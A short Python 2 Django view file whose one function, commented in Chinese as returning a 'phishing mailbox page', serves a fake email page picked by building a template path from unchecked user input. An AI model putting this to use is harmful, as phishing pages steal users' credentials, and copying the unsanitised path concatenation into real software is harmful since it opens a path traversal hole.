# -*- coding: utf-8 -*-
'''
Created on 2012-6-21

@author: Administrator
'''
#python
import os
import sys

#django
from django.http import HttpResponse
from django.http import HttpResponseRedirect
from django.shortcuts import render_to_response
from django.template import RequestContext

#Dao

#view


#返回钓鱼邮箱页面
def showEmail(request,mail):
    print '#'*20+'进入showEmail('+mail+')'+'#'*20
    
    return render_to_response('app/'+mail+'/index.html',locals())